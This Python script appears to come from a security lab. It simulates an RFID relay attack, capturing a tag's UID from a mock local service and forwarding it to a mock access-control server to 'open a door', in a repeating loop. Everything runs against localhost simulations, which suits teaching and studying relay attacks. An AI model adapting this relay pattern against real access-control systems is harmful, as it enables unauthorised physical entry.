#!/usr/bin/env python3
import socket, json, threading, time
from colorama import Fore, init
import requests
from datetime import datetime

init(autoreset=True)

def send_to_dashboard(proto, msg, cls):
    try:
        now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        requests.post('http://127.0.0.1:8080/api/log', json={
            't': now, 'proto': proto, 'msg': msg, 'cls': cls
        }, timeout=0.5)
    except:
        pass

def relay_attack():
    print(f'{Fore.RED}[RELAY] Step 1: Query tag at location A (near victim)')
    s_tag = socket.socket()
    s_tag.settimeout(2)
    s_tag.connect(('127.0.0.1', 6001))
    s_tag.send(json.dumps({'cmd': 'QUERY'}).encode())
    tag_resp = json.loads(s_tag.recv(512).decode())
    s_tag.close()
    
    uid = tag_resp.get('uid', '')
    print(f'{Fore.RED}[RELAY] Captured UID from tag: {uid}')
    
    send_to_dashboard('RFID', f'RELAY Attack forwarding UID={uid} to AC Server', 'NORMAL')
    
    print(f'{Fore.RED}[RELAY] Step 2: Relay UID to AC Server at location B (door)')
    s_ac = socket.socket()
    s_ac.settimeout(2)
    s_ac.connect(('127.0.0.1', 7001))
    s_ac.send(json.dumps({'cmd': 'AUTH', 'uid': uid, 'timestamp': time.time()}).encode())
    ac_resp = json.loads(s_ac.recv(512).decode())
    s_ac.close()
    
    print(f'{Fore.GREEN}[RELAY] AC Response: {ac_resp}')
    print(f'{Fore.RED}[RELAY] Door at LOCATION B opened using card at LOCATION A!')

if __name__ == '__main__':
    relay_attack()

while True:
    try:
        relay_attack()
    except Exception as e:
        print(f"Lỗi: {e}")
    print("Đang đợi 5 giây để tiếp sóng tiếp...")
    time.sleep(5)